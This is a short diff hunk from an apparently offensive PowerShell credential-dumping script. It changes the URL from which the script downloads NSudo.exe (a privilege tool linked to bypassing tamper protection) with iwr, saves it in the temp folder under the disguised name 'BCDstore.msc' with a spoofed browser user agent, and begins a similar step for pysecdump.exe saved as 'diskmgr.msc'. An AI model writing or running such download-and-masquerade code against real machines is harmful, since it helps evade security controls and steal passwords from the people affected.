@@ -94,7 +94,7 @@ If($GetPasswords -ieq "Enum"){
 
       ## Download and masquerade the required standalone executables
       If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
-         iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+         iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
       If(-not(Test-Path -Path "$Env:TMP\diskmgr.msc" -EA SilentlyContinue)){
          ## https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe
